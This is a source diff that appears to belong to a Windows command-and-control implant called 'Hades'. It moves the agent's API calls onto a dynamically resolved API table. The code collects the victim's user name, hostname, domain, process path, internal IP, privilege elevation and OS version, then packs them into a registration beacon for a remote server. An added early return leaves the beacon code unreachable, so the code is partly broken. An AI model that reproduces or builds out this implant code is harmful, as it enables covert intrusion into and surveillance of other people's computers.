@@ -6,28 +6,22 @@
 #include "../utils/bytes.hpp"
 #include "../shared/nt.hpp"
 #include "../networkd/network.hpp"
+#include "../hades/hades.h"
 #include "config.hpp"
 
 
-WINAPIS* WinApis = NULL;
-MODULES* kModules = NULL;
-
 #define MSG_REGISTER 1
 
-BOOL GetVer(DWORD *minor, DWORD *major, DWORD *build) {
-	DWORD m, mm, b;
-	WinApis->RtlGetNtVersionNumbers(&m, &mm, &b);
-	b &= 0x0FFFFFFF;
-	*minor = mm;
-	*major = m;
-	*build = b;
+BOOL GetVer(DWORD* major, DWORD* minor, DWORD* build) {
+	hades->NtApis.RtlGetNtVersionNumbers(major, minor, build);
+		
 	return TRUE;
 }
 
 
 ULONG GenID() {
-	ULONG S = WinApis->GetTickCount();
-	ULONG id = WinApis->RtlRandomEx(&S);
+	ULONG S = hades->WinApis.GetTickCount();
+	ULONG id = hades->NtApis.RtlRandomEx(&S);
 	return id;
 }
 
@@ -35,7 +29,7 @@ ULONG GenID() {
 PBYTE CollectProcessPath(DWORD* out) {
 	PBYTE buffer = AllocMemory<BYTE>(32767);
 
-	DWORD Len = WinApis->GetModuleFileNameA(NULL, (PCHAR)buffer, 32767);
+	DWORD Len = hades->WinApis.GetModuleFileNameA(NULL, (PCHAR)buffer, 32767);
 	*out = Len;
 	return buffer;
 
@@ -45,10 +39,10 @@ PBYTE CollectProcessPath(DWORD* out) {
 
 PBYTE CollectUser(DWORD* out) {
 	DWORD BufSize = NULL;
-	WinApis->GetUserNameA(NULL, &BufSize);
+	hades->WinApis.GetUserNameA(NULL, &BufSize);
 	PBYTE buffer = AllocMemory<BYTE>(BufSize);
 
-	if (!WinApis->GetUserNameA((PCHAR)buffer, &BufSize)) {
+	if (!hades->WinApis.GetUserNameA((PCHAR)buffer, &BufSize)) {
 		return NULL;
 	}
 	*out = BufSize;
@@ -59,10 +53,10 @@ PBYTE CollectUser(DWORD* out) {
 
 PBYTE CollectHost(DWORD* out) {
 	DWORD BufSize = NULL;
-	WinApis->GetComputerNameExA(ComputerNameDnsHostname, NULL, &BufSize);
+	hades->WinApis.GetComputerNameExA(ComputerNameDnsHostname, NULL, &BufSize);
 	PBYTE buffer = AllocMemory<BYTE>(BufSize);
 
-	if (!WinApis->GetComputerNameExA(ComputerNameDnsHostname, (PCHAR)buffer, &BufSize)) {
+	if (!hades->WinApis.GetComputerNameExA(ComputerNameDnsHostname, (PCHAR)buffer, &BufSize)) {
 		return NULL;
 	}
 	*out = BufSize;
@@ -72,10 +66,10 @@ PBYTE CollectHost(DWORD* out) {
 
 PBYTE CollectDomainName(DWORD* out) {
 	DWORD BufSize = NULL;
-	WinApis->GetComputerNameExA(ComputerNameDnsDomain, NULL, &BufSize);
+	hades->WinApis.GetComputerNameExA(ComputerNameDnsDomain, NULL, &BufSize);
 	PBYTE buffer = AllocMemory<BYTE>(BufSize);
 
-	if (!WinApis->GetComputerNameExA(ComputerNameDnsDomain, (PCHAR)buffer, &BufSize)) {
+	if (!hades->WinApis.GetComputerNameExA(ComputerNameDnsDomain, (PCHAR)buffer, &BufSize)) {
 		return NULL;
 	}
 	*out = BufSize;
@@ -90,15 +84,15 @@ BOOL IsElevated() {
 	TOKEN_ELEVATION Elev = { 0 };
 	BOOL isElev = FALSE;
 	DWORD size = sizeof(TOKEN_ELEVATION);
-	NTSTATUS stat = WinApis->NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
+	NTSTATUS stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
 	if (stat > 0) {
-		BOOL check = WinApis->GetTokenInformation(tok, TokenElevation, &Elev, sizeof(Elev), &size);
+		BOOL check = hades->WinApis.GetTokenInformation(tok, TokenElevation, &Elev, sizeof(Elev), &size);
 		if (check) {
 			isElev = (BOOL)(Elev.TokenIsElevated != FALSE) ? 1 : 0;
 		}
 	}
 	if (tok) {
-		WinApis->CloseHandle(tok);
+		hades->WinApis.CloseHandle(tok);
 	}
 
 	return isElev;
@@ -109,10 +103,10 @@ PBYTE GetInternalIP(DWORD* out) {
 	ULONG BufLen = 0;
 	PIP_ADAPTER_INFO adapter = NULL;
 	PIP_ADAPTER_INFO adapter_info = NULL;
-	WinApis->GetAdaptersInfo(NULL, &BufLen);
+	hades->WinApis.GetAdaptersInfo(NULL, &BufLen);
 	adapter_info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BufLen);
 	
-	DWORD ret = WinApis->GetAdaptersInfo(adapter_info, &BufLen);
+	DWORD ret = hades->WinApis.GetAdaptersInfo(adapter_info, &BufLen);
 	if (ret != ERROR_SUCCESS) {
 		HeapFree(GetProcessHeap(), 0, adapter);
 		return NULL;
@@ -136,7 +130,7 @@ ULONG GetPPID() {
 	PROCESS_BASIC_INFORMATION pBI = { 0 };
 	ULONG RetLen = 0;
 
-	NTSTATUS Stat = WinApis->NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pBI, sizeof(pBI), &RetLen);
+	NTSTATUS Stat = hades->NtApis.NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pBI, sizeof(pBI), &RetLen);
 	return (ULONGLONG)(ULONG_PTR)pBI.InheritedFromUniqueProcessId;
 
 }
@@ -144,14 +138,18 @@ ULONG GetPPID() {
 
 BOOL InitAgent() {
 	
-	WinApis =  AllocMemory <WINAPIS>   (sizeof(struct WINAPIS));
-	kModules = AllocMemory <MODULES>   (sizeof(struct MODULES));
-	g_ByteMgr = AllocMemory <bytes>    (sizeof(bytes));
-	g_Network = AllocMemory <Network>  (sizeof(Network));
+	hades      = AllocMemory<Hades>(sizeof(Hades));
+	g_ByteMgr =  AllocMemory <bytes>    (sizeof(bytes));
+	g_Network =  AllocMemory <Network>  (sizeof(Network));
 	if (!LoadAPIS()) { return FALSE; }
 	if (!LoadConfig()) { return FALSE; }
+	return TRUE;
+	
 	*g_Network = Network();
 	
+
+
+
 
 
 	DWORD UserLen, HostLen, DomainLen, ProcessPathLen, IpLen, Major, Minor, Build;;
@@ -192,7 +190,7 @@ BOOL InitAgent() {
 		[Major]			  4 BYTES
 		[Build]			  4 BYTES*/
 	g_ByteMgr->InitWrite();
-	g_ByteMgr->Write4(1);
+	g_ByteMgr->Write4(MSG_REGISTER);
 	g_ByteMgr->Write4(HadesID);
 	g_ByteMgr->Write4(UserLen);
 	g_ByteMgr->WriteString(User, UserLen);
